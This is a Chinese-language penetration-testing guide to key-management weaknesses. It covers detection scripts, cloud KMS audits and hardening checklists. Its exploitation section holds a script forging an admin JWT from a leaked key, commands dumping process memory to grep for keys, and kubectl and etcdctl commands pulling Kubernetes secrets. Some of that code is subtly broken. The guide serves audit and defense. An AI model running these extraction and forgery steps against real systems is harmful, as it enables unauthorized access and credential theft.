# 密钥管理攻击

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供密钥管理攻击的方法论。通过本指南，测试人员可以识别和利用密钥生命周期管理中的安全缺陷，包括密钥生成、存储、分发、轮换和销毁等环节。

### 1.2 适用范围
本文档适用于以下场景：
- 企业密钥管理审计
- KMS（密钥管理系统）安全评估
- HSM（硬件安全模块）配置审查
- 云密钥服务测试
- 应用密钥实现分析

### 1.3 读者对象
- 渗透测试工程师
- 密钥管理审计人员
- 安全架构师
- 合规性检测人员

---

## 第二部分：核心渗透技术专题

### 专题一：密钥管理攻击

#### 2.1 技术介绍

**密钥管理攻击**是针对密钥全生命周期管理缺陷的攻击技术。即使使用强加密算法，密钥管理不当也会导致加密系统被攻破。

**密钥生命周期阶段：**

```
┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│  密钥    │ -> │  密钥    │ -> │  密钥    │ -> │  密钥    │ -> │  密钥    │
│  生成    │    │  存储    │    │  使用    │    │  轮换    │    │  销毁    │
└──────────┘    └──────────┘    └──────────┘    └──────────┘    └──────────┘
     │               │               │               │               │
     ▼               ▼               ▼               ▼               ▼
  弱随机数       明文存储       过度权限       未轮换         残留密钥
  硬编码         访问控制弱     日志泄露       轮换周期长     恢复可能
```

**密钥管理核心问题：**

| 阶段 | 常见问题 | 风险等级 |
|------|---------|---------|
| 生成 | 弱 PRNG、硬编码 | 严重 |
| 存储 | 明文、弱访问控制 | 严重 |
| 分发 | 未加密传输、中间人 | 高危 |
| 使用 | 过度权限、日志泄露 | 高危 |
| 轮换 | 未轮换、周期过长 | 中 - 高危 |
| 销毁 | 未完全删除、可恢复 | 中危 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 云环境 | AWS KMS、Azure Key Vault | IAM 配置错误、密钥泄露 |
| 企业应用 | 数据库加密、文件加密 | 密钥与数据同存储 |
| 支付系统 | HSM 密钥管理 | 密钥注入流程缺陷 |
| 区块链 | 钱包密钥、多签密钥 | 密钥分片泄露 |
| IoT | 设备密钥、固件签名密钥 | 硬编码、弱保护 |
| 微服务 | 服务间认证密钥 | 密钥共享、未轮换 |

#### 2.3 漏洞检测方法

##### 2.3.1 密钥存储检测

```bash
# 检测代码中的硬编码密钥
grep -r "secret\|password\|api_key\|private_key" \
    --include="*.py" --include="*.js" --include="*.java" \
    --include="*.go" --include="*.rb" .

# 检测配置文件中的密钥
find . -name "*.env" -o -name "*.config" -o -name "*.yml" -o -name "*.json" | \
    xargs grep -l "secret\|key\|password"

# 检测 Git 历史中的密钥
trufflehog git https://github.com/org/repo.git
gitleaks detect --source ./repo

# 检测环境变量中的密钥
env | grep -iE "secret|key|password|token"

# 检测 Kubernetes Secret
kubectl get secrets -A
kubectl get secret secret-name -o yaml
```

```python
#!/usr/bin/env python3
"""
密钥存储安全检测脚本
"""
import os
import re
import subprocess

def detect_insecure_key_storage(target_path):
    """检测不安全的密钥存储"""
    
    print("[*] 密钥存储安全检测")
    
    issues = []
    
    # 检查常见不安全位置
    insecure_locations = [
        'config.json',
        'settings.py',
        '.env',
        'application.properties',
        'secrets.yaml',
        'credentials',
    ]
    
    for loc in insecure_locations:
        full_path = os.path.join(target_path, loc)
        if os.path.exists(full_path):
            issues.append(f"发现敏感文件：{loc}")
    
    # 检查 Git 仓库
    if os.path.exists(os.path.join(target_path, '.git')):
        print("[*] 检测 Git 历史中的密钥...")
        result = subprocess.run(
            ['git', 'log', '-p', '--all', '--', '*.key', '*.pem', '*.p12'],
            capture_output=True, text=True, cwd=target_path
        )
        if result.stdout:
            issues.append("Git 历史中发现密钥文件")
    
    # 检查密钥文件权限
    for root, dirs, files in os.walk(target_path):
        for file in files:
            if file.endswith(('.key', '.pem', '.p12', '.pfx')):
                full_path = os.path.join(root, file)
                stat = os.stat(full_path)
                
                # 检查权限是否过于宽松
                if stat.st_mode & 0o777 > 0o600:
                    issues.append(f"密钥文件权限过宽：{full_path}")
    
    # 报告结果
    if issues:
        print(f"\n[!] 发现 {len(issues)} 个问题:")
        for issue in issues:
            print(f"    - {issue}")
    else:
        print("\n[+] 未发现明显密钥存储问题")
    
    return issues

# 使用示例
# detect_insecure_key_storage("/path/to/project")
```

##### 2.3.2 密钥轮换检测

```bash
# AWS KMS 密钥轮换检测
aws kms list-keys --query 'Keys[*].KeyId' | while read key_id; do
    aws kms get-key-rotation-status --key-id "$key_id" \
        --query 'KeyRotationEnabled' \
        --output text
done

# Azure Key Vault 密钥版本检测
az keyvault key list-versions --vault-name vault-name --name key-name \
    --query 'length(@)'

# 检查密钥年龄
# 超过 1 年未轮换的密钥视为高风险
```

```python
#!/usr/bin/env python3
"""
密钥轮换策略检测
"""
from datetime import datetime, timedelta

def analyze_key_rotation_policy(keys_metadata):
    """分析密钥轮换策略"""
    
    print("[*] 密钥轮换策略分析")
    
    issues = []
    current_time = datetime.now()
    
    for key in keys_metadata:
        key_id = key.get('id')
        created = key.get('created')
        updated = key.get('updated')
        rotation_policy = key.get('rotation_policy')
        
        # 检查密钥年龄
        if created:
            age = current_time - created
            if age > timedelta(days=365):
                issues.append(f"{key_id}: 密钥年龄超过 1 年")
        
        # 检查轮换策略
        if not rotation_policy:
            issues.append(f"{key_id}: 未配置轮换策略")
        else:
            expiry = rotation_policy.get('expiry_time')
            if expiry and expiry > timedelta(days=90):
                issues.append(f"{key_id}: 轮换周期过长 ({expiry.days} 天)")
        
        # 检查自动轮换
        if rotation_policy and not rotation_policy.get('automatic'):
            issues.append(f"{key_id}: 未启用自动轮换")
    
    # 报告
    print(f"\n[!] 发现 {len(issues)} 个轮换问题:")
    for issue in issues:
        print(f"    - {issue}")
    
    return issues

# 最佳实践建议
print("""
密钥轮换最佳实践:
- 对称密钥：90 天轮换
- 非对称密钥：1-2 年轮换
- 口令/密码：90 天更换
- API 密钥：180 天轮换
- 紧急轮换：泄露后立即轮换
""")
```

##### 2.3.3 密钥访问控制检测

```bash
# AWS KMS 密钥策略检测
aws kms get-key-policy --key-id key-id --policy-name default \
    --query 'Policy' --output text | jq

# 检查是否有过度权限
# 查找 "*" 资源或 "kms:*" 操作

# Azure Key Vault 访问策略检测
az keyvault show --name vault-name --query 'accessPolicies'

# 检查是否有不必要的权限
# 如：普通用户有密钥管理权限

# GCP KMS IAM 策略检测
gcloud kms keys get-iam-policy key-id --keyring ring --location global
```

```python
#!/usr/bin/env python3
"""
密钥访问控制分析
"""
import json

def analyze_key_access_policy(policy):
    """分析密钥访问策略"""
    
    print("[*] 密钥访问控制分析")
    
    issues = []
    
    # AWS KMS 策略分析
    if isinstance(policy, str):
        policy = json.loads(policy)
    
    for statement in policy.get('Statement', []):
        effect = statement.get('Effect')
        actions = statement.get('Action', [])
        resources = statement.get('Resource', [])
        principals = statement.get('Principal', {})
        
        # 检查允许所有操作
        if effect == 'Allow':
            if '*' in actions or 'kms:*' in actions:
                issues.append("允许所有 KMS 操作")
            
            # 检查允许所有资源
            if '*' in resources:
                issues.append("允许访问所有密钥")
            
            # 检查允许所有主体
            if principals == '*':
                issues.append("允许所有主体访问")
            
            # 检查跨账户访问
            if 'AWS' in principals:
                aws_principals = principals['AWS']
                if isinstance(aws_principals, str):
                    aws_principals = [aws_principals]
                
                for principal in aws_principals:
                    if ':' not in principal or principal.startswith('arn:aws:iam::*'):
                        issues.append(f"宽松的跨账户访问：{principal}")
    
    # 报告
    if issues:
        print(f"\n[!] 发现 {len(issues)} 个访问控制问题:")
        for issue in issues:
            print(f"    - {issue}")
    else:
        print("\n[+] 访问控制配置良好")
    
    return issues
```

##### 2.3.4 密钥使用审计检测

```bash
# AWS CloudTrail 密钥使用审计
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=ResourceName,AttributeValue=key-id \
    --start-time $(date -d '30 days ago' +%Y-%m-%d)

# 检查异常使用模式
# - 非工作时间使用
# - 异常地理位置
# - 异常频率

# Azure Key Vault 日志审计
az monitor activity-log list \
    --resource-group rg-name \
    --resource-id "/subscriptions/sub-id/providers/Microsoft.KeyVault/vaults/vault-name"
```

#### 2.4 漏洞利用方法

##### 2.4.1 硬编码密钥利用

```python
#!/usr/bin/env python3
"""
硬编码密钥利用
"""
import requests
import re

def exploit_hardcoded_key(app_url, hardcoded_key):
    """利用硬编码密钥"""
    
    print(f"[*] 利用硬编码密钥：{hardcoded_key[:10]}...")
    
    # 场景 1: JWT 密钥
    import jwt
    
    payload = {"admin": True, "user_id": 1}
    token = jwt.encode(payload, hardcoded_key, algorithm='HS256')
    
    resp = requests.get(f"{app_url}/admin", 
                       headers={"Authorization": f"Bearer {token}"})
    
    if resp.status_code == 200:
        print("[+] JWT 密钥利用成功 - 获取管理员权限")
    
    # 场景 2: 加密密钥
    from Crypto.Cipher import AES
    
    # 假设有加密的敏感数据
    encrypted_data = requests.get(f"{app_url}/api/encrypted-config").content
    
    # 使用硬编码密钥解密
    cipher = AES.new(hardcoded_key.encode().ljust(32), AES.MODE_GCM)
    # ... 解密逻辑
    
    # 场景 3: API 密钥
    api_headers = {"X-API-Key": hardcoded_key}
    resp = requests.get(f"{app_url}/api/sensitive-data", headers=api_headers)
    
    if resp.status_code == 200:
        print("[+] API 密钥利用成功 - 获取敏感数据")
        print(resp.json())

# 使用示例
# exploit_hardcoded_key("https://target.com", "super_secret_key_123")
```

##### 2.4.2 密钥提取攻击

```bash
# 从内存提取密钥

# Linux 进程内存
gdb -p <pid> -batch -command <(echo "generate-core-file /tmp/core")
strings /tmp/core.* | grep -E "[0-9a-fA-F]{32}|[0-9a-fA-F]{64}"

# Windows 进程内存
procdump -ma <pid> dump.dmp
strings dump.dmp | grep -E "secret|key|password"

# Kubernetes Secret 提取
# 如果有集群访问权限
kubectl get secret -n kube-system -o jsonpath='{.items[*].data}' | base64 -d

# etcd 提取（如果有访问权限）
etcdctl get /registry/secrets --print-value-only
```

```python
#!/usr/bin/env python3
"""
自动化密钥提取
"""
import subprocess
import re

def extract_keys_from_process(pid):
    """从进程内存提取密钥"""
    
    print(f"[*] 从进程 {pid} 提取密钥...")
    
    # 创建内存转储
    try:
        subprocess.run(['gdb', '-p', str(pid), '-batch',
                       '-command', '-c', 'generate-core-file /tmp/core'],
                      timeout=10)
    except:
        print("[-] gdb 不可用或无权限")
        return []
    
    # 搜索密钥模式
    patterns = [
        r'[0-9a-fA-F]{32}',  # 128 位
        r'[0-9a-fA-F]{64}',  # 256 位
        r'-----BEGIN.*KEY-----',  # PEM 格式
        r'AKIA[0-9A-Z]{16}',  # AWS Access Key
    ]
    
    found_keys = []
    
    try:
        result = subprocess.run(['strings', '/tmp/core.*'],
                               capture_output=True, text=True)
        
        for pattern in patterns:
            matches = re.findall(pattern, result.stdout)
            found_keys.extend(matches[:10])  # 限制数量
    except:
        pass
    
    print(f"[+] 找到 {len(found_keys)} 个候选密钥")
    for key in found_keys[:5]:
        print(f"    - {key[:20]}...")
    
    return found_keys

# 使用示例（仅授权测试）
# extract_keys_from_process(1234)
```

##### 2.4.3 密钥轮换绕过

```python
#!/usr/bin/env python3
"""
密钥轮换绕过攻击
"""

def key_rotation_bypass_attack():
    """
    绕过密钥轮换的攻击场景
    """
    
    print("""
    攻击场景 1: 旧密钥仍然有效
    
    描述:
    - 系统轮换密钥后，旧密钥未失效
    - 攻击者使用旧密钥仍然可以解密/签名
    
    利用:
    1. 获取历史密钥（从备份、日志、配置）
    2. 使用旧密钥访问系统
    3. 绕过轮换保护
    
    防御:
    - 实施密钥撤销
    - 验证密钥版本
    - 审计旧密钥使用
    """)
    
    print("""
    攻击场景 2: 密钥版本混淆
    
    描述:
    - 系统未正确跟踪密钥版本
    - 攻击者可以强制使用旧版本密钥
    
    利用:
    1. 降级攻击到弱密钥版本
    2. 利用旧密钥的已知漏洞
    3. 绕过新密钥的增强保护
    
    防御:
    - 强制最低密钥版本
    - 密钥版本协商
    - 拒绝弱密钥
    """)
    
    print("""
    攻击场景 3: 轮换期间双密钥窗口
    
    描述:
    - 轮换期间新旧密钥同时有效
    - 攻击窗口可能被利用
    
    利用:
    1. 在轮换窗口期获取新密钥
    2. 同时保留旧密钥访问
    3. 延长实际密钥寿命
    
    防御:
    - 缩短轮换窗口
    - 原子密钥切换
    - 监控双密钥使用
    """)

# 教育目的
```

##### 2.4.4 云密钥服务攻击

```python
#!/usr/bin/env python3
"""
云密钥服务攻击
"""
import boto3
import json

def aws_kms_attack_scenario():
    """
    AWS KMS 攻击场景
    """
    
    print("[*] AWS KMS 攻击场景")
    
    # 场景 1: IAM 权限提升
    print("""
    场景 1: IAM 权限提升
    
    前提:
    - 有 iam:CreateAccessKey 权限
    - 目标用户有 kms:Decrypt 权限
    
    攻击:
    1. 创建目标用户的访问密钥
    2. 使用新密钥调用 KMS Decrypt
    3. 获取明文数据密钥
    
    防御:
    - 最小权限原则
    - 启用 MFA 删除
    - 监控异常密钥创建
    """)
    
    # 场景 2: 密钥策略绕过
    print("""
    场景 2: 密钥策略绕过
    
    前提:
    - 密钥策略配置不当
    - 允许跨账户访问
    
    攻击:
    1. 创建受信任的 AWS 账户
    2. 通过信任关系访问 KMS 密钥
    3. 解密目标数据
    
    防御:
    - 限制跨账户访问
    - 使用 VPC Endpoint
    - 启用密钥策略审计
    """)
    
    # 实际代码示例（仅授权测试）
    # client = boto3.client('kms')
    # response = client.decrypt(CiphertextBlob=encrypted_data)

def azure_key_vault_attack():
    """
    Azure Key Vault 攻击场景
    """
    
    print("[*] Azure Key Vault 攻击场景")
    
    print("""
    场景 1: 访问策略滥用
    
    前提:
    - Service Principal 有 Key Vault 访问权限
    - 权限范围过大
    
    攻击:
    1. 获取 Service Principal 凭证
    2. 访问 Key Vault 所有密钥
    3. 解密敏感数据
    
    防御:
    - 最小权限
    - 启用私有链接
    - 网络隔离
    """)
    
    print("""
    场景 2: 托管身份滥用
    
    前提:
    - VM 托管身份有 Key Vault 访问权
    - 攻击者获取 VM 访问权
    
    攻击:
    1. 获取 VM 访问权限
    2. 使用托管身份访问 Key Vault
    3. 提取密钥
    
    防御:
    - 限制托管身份权限
    - 启用 Key Vault 防火墙
    - 监控异常访问
    """)

# 教育目的
```

#### 2.5 安全配置建议

##### 2.5.1 密钥管理最佳实践

```
密钥生成:
- 使用加密安全的 PRNG
- 密钥长度符合标准（AES-256, RSA-3072+）
- 唯一密钥 per 用途/环境

密钥存储:
- 使用 HSM 或 KMS
- 密钥与数据分离存储
- 启用密钥加密密钥（KEK）

密钥分发:
- 加密传输
- 使用安全通道（TLS）
- 双向认证

密钥使用:
- 最小权限原则
- 审计所有使用
- 限制使用频率

密钥轮换:
- 定期轮换（90 天 -1 年）
- 自动化轮换
- 旧密钥安全销毁

密钥销毁:
- 安全删除（多次覆盖）
- HSM 安全擦除
- 验证销毁完成
```

##### 2.5.2 密钥管理检查清单

**策略层面:**
- [ ] 密钥管理策略文档
- [ ] 密钥分类分级
- [ ] 密钥生命周期定义
- [ ] 应急响应流程
- [ ] 合规性要求映射

**技术层面:**
- [ ] 使用 KMS/HSM
- [ ] 密钥加密存储
- [ ] 访问控制（IAM）
- [ ] 审计日志
- [ ] 自动轮换
- [ ] 密钥撤销机制

**操作层面:**
- [ ] 密钥清单/清单
- [ ] 密钥所有者明确
- [ ] 定期审计
- [ ] 备份和恢复测试
- [ ] 事件响应演练

**云环境:**
- [ ] 云 KMS 正确配置
- [ ] IAM 策略最小权限
- [ ] 网络隔离（VPC、私有链接）
- [ ] 跨区域复制
- [ ] 多云密钥管理

---

## 第三部分：附录

### 3.1 密钥管理工具

| 工具 | 用途 | 平台 |
|-----|------|------|
| AWS KMS | 云密钥管理 | AWS |
| Azure Key Vault | 云密钥管理 | Azure |
| GCP KMS | 云密钥管理 | GCP |
| HashiCorp Vault | 开源密钥管理 | 跨平台 |
| OpenSSL | 密钥生成和管理 | 跨平台 |
| GnuPG | PGP 密钥管理 | 跨平台 |

### 3.2 密钥管理风险评级

| 风险 | 影响 | 可能性 | 优先级 |
|-----|------|--------|--------|
| 硬编码密钥 | 严重 | 高 | 紧急 |
| 明文存储密钥 | 严重 | 中 | 紧急 |
| 未轮换密钥 | 高危 | 高 | 高 |
| 过度权限 | 高危 | 中 | 高 |
| 无审计日志 | 中危 | 高 | 中 |
| 弱密钥生成 | 严重 | 低 | 高 |

### 3.3 密钥长度建议

| 用途 | 最小长度 | 推荐长度 |
|-----|---------|---------|
| 对称加密 | 128 位 | 256 位 |
| RSA | 2048 位 | 3072+ 位 |
| ECC | 256 位 | 384 位 |
| DH 密钥交换 | 2048 位 | 3072+ 位 |
| HMAC | 256 位 | 512 位 |

---

## 参考资源

- [NIST SP 800-57 - Key Management](https://csrc.nist.gov/publications/detail/sp/800-57/part-1/rev-5/final)
- [OWASP Key Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html)
- [AWS KMS Best Practices](https://docs.aws.amazon.com/kms/latest/developerguide/best-practices.html)
- [Azure Key Vault Best Practices](https://learn.microsoft.com/en-us/azure/key-vault/general/best-practices)
